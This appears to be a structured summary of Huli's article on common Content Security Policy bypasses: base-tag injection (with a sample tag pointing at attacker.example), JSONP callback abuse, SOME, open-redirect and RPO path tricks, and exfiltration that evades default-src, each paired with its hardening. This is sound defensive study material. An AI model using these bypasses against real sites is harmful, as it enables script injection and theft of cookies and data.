# Common CSP bypasses (Huli, Beyond XSS ch2)

Reference / technique writeup. Catalogs how a Content Security Policy that blocks inline XSS can still be defeated when the policy is loose or incomplete. Defensive framing: each technique is paired with the misconfiguration that enables it and the hardening that closes it.

- **Vuln type / sub-variant:** CSP bypass enabling XSS execution despite a script-src restriction. Sub-variants: unsafe allowlisted CDN, base-tag injection against nonce policies, JSONP endpoint on an allowlisted host, redirect-based path bypass, Relative Path Overwrite (RPO), and data exfiltration under a strict default-src.
- **Target type:** Any web app relying on CSP as a second line of defense where the attacker already has HTML injection but needs to turn it into script execution.
- **Recon signal:** A CSP header or meta tag that allows a broad CDN (for example a bare `https://unpkg.com/`), lists third-party hosts that also expose callback endpoints (reCAPTCHA, Google), uses a nonce but omits `base-uri`, or specifies a path but the host permits open redirects / `%2f` path games.
- **Root cause:** CSP only restricts the sources it names, and several directives do not fall back to `default-src`. Allowlisting a whole host or CDN trusts every file and endpoint on it. `base-uri` is independent, so if it is unset a nonce policy can still be undermined. Path restrictions are weakened by server-side redirects and by browser/server disagreement over URL encoding.
- **Exploitation steps (mechanism, defensively):**
  1. Base-tag technique: when the policy trusts nonce'd scripts that load relative sources (for example a nonce'd `<script src="app.js">`), an injected `<base href="https://attacker.example/">` element retargets every relative path, so the browser resolves the legitimate relative script against the attacker origin and fetches attacker code. The injected base element itself needs no nonce. Minimal illustrative fragment: `<base href="https://attacker.example/">`.
  2. JSONP-endpoint class: an allowlisted host exposes a callback endpoint that reflects the `callback` parameter into executable JS before its JSON payload. Loading that endpoint as a script with a crafted callback value runs attacker-chosen code from a trusted origin. High-level example: a search/suggest endpoint on an allowlisted Google host that echoes `?...&callback=<name>`. Where the callback is character-restricted, Same Origin Method Execution (SOME) can still invoke an existing same-origin method.
  3. Allowlist/path weaknesses: a broad CDN entry lets the attacker load a purpose-built csp-bypass library already published there. A server-side open redirect on an allowlisted host defeats path restrictions because redirects are not re-checked against the path. RPO abuses `%2f` so the browser sees a compliant path while the server decodes `../` and serves a different (attacker-useful) script.
- **Bypasses used:** base-tag relative-path hijack, JSONP callback reflection, SOME, open-redirect path bypass, RPO encoding differential, and exfiltration channels that evade `default-src 'none'` (navigation via `window.location`, WebRTC TURN, `dns-prefetch`).
- **Impact:** Arbitrary JavaScript execution and/or data exfiltration (for example `document.cookie`) on a site that believed CSP neutralized its XSS.
- **Bounty:** n/a (technique article).
- **Lesson / pattern:** A CSP is only as strong as its least-restrictive source. Harden with `base-uri 'none'`, exact CDN paths pinned to a version, audit allowlisted hosts for JSONP/upload endpoints, avoid open redirects, and remember `default-src 'none'` does not fully stop exfiltration.
- **Source:**
  - Title: Bypassing Your Defenses: Common CSP Bypasses (Beyond XSS ch2)
  - Author: aszx87410 (Huli)
  - URL: https://aszx87410.github.io/beyond-xss/en/ch2/csp-bypass/
  - Date: not stated
  - Disclosed report: none
  - Raw file: `sources/xss/24-huli-beyond-xss-csp-bypasses.md`

Tags: csp-bypass, base-tag, jsonp, nonce-reuse, methodology, encoding
